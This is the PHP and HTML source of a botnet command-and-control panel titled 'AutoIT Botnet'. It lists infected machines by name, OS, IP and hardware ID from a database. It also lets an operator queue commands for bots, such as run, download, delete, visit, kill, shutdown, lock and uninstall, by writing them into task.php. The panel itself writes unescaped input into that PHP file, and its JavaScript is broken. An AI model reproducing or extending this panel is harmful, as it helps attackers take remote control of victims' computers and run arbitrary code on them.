<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
	<head>
		<title>AutoIT Botnet</title>
		<link href="default.css" rel="stylesheet" type="text/css" media="all" />
		<link href="fonts.css" rel="stylesheet" type="text/css" media="all" />
		<script type="javascript">
			function combo(commands-list, cmd)
			{
				cmd = document.getElementById(cmd);
				
				var idx = commands-list.selectedIndex;
				var content = commands-list.options[idx].innerHTML;
				cmd.value = content.cmd;
			}
			
			function comboInit(commands-list)
			{
				cmd = document.getElementById(cmd);
				var idx = commands-list.selectedIndex;
				var content = commands-list.options[idx].innerHTML;
				if(cmd.value == "")
					cmd.value = content;
			}
		</script>
	</head>
	<body>
		<div id="page" class="container">
			<div id="header">
				<div id="logo">
					<img src="images/logo.jpg" alt="" />
					<h1><a href="#">AutoIT</a></h1>
				</div>
				<div id="menu">
					<ul>
						<li class="current_page_item"><a href="#" accesskey="1" title="Overview">Overview</a></li>
						<li><a href="#" accesskey="2" title="Bots">Bots</a></li>
						<li><a href="#" accesskey="3" title="Configure Panel">Configure Panel</a></li>
					</ul>
				</div>
			</div>
			<div id="welcome">
				<div class="title">
					<h2>Bots</h2>
					
					<table>
						<thead>
							<tr>
								<th>PC Name</th>
								<th>OS</th>
								<th>32bit / 64bit</th>
								<th>IP</th>
								<th>HWID</th>
							</tr>
						</thead>
					</table>
					
					<?php
						$server = mysqli_connect("localhost", "root", "", "autoit");
						$query = mysqli_query($server, "select * from bot_list");
					?>
					
					<table>
						<tbody>
							<?php
								while ($row = mysqli_fetch_array($query)) {
									echo "<tr>";
										echo "<td>".$row['pcname']."</td>";
										echo "<td>".$row['os']."</td>";
										echo "<td>".$row['bit']."</td>";
										echo "<td>".$row['ip']."</td>";
										echo "<td>".$row['hwid']."</td>";
									echo "</tr>";
								}
							?>
						</tbody>
					</table>
				</div>
				<ul class="actions">
					<li>
						<form action='?' method='POST'>
							<input type='text' name='cmd' list="commands-list" size='40'>
							<br />
							<input type='submit' value='Start Task'>
						</form>
						<datalist id="commands-list" name="commands-list" onChange="combo(this, 'commands-list')" onMouseOut="comboInit(this, 'cmd')">
							<option value="Run?">Run?</option>
							<option value="Download?">Download?</option>
							<option value="Delete?">Delete?</option>
							<option value="Visit?">Visit?</option>
							<option value="Kill?">Kill?</option>
							<option value="Box?">Box? ?</option>
							<option value="Shutdown">Shutdown</option>
							<option value="Restart">Restart</option>
							<option value="Lock">Lock</option>
							<option value="Unlock">Unlock</option>
							<option value="Beep">Beep</option>
							<option value="CDOpen">CDOpen</option>
							<option value="CDClose">CDClose</option>
							<option value="Uninstall?">Uninstall?</option>
						</datalist>
					</li>
				</ul>
			</div>
				<center>
					<?php 
						if (isset($_POST['cmd'])) 
						{
							$cmd = $_POST['cmd'];
							$fp = fopen('task.php', 'w');
							fwrite($fp, '<?php echo "'.$cmd.'" ?>');
							fclose($fp);
							echo $cmd;
						}
					?>
				</center>
				<form method='POST' action='--WEBBOT-SELF--'>
					<!--webbot bot='SaveResults' U-File='fpweb:///_private/form_results.csv' S-Format='TEXT/CSV' S-Label-Fields='TRUE' -->
					<textarea rows='10' name='ControlCenter' cols='100' style='font-weight: bold'>Command Sent: <?php if (isset($_POST['cmd'])) echo $cmd;?> </textarea>
				</form>
			</div>
		</div>
	</body>
</html>
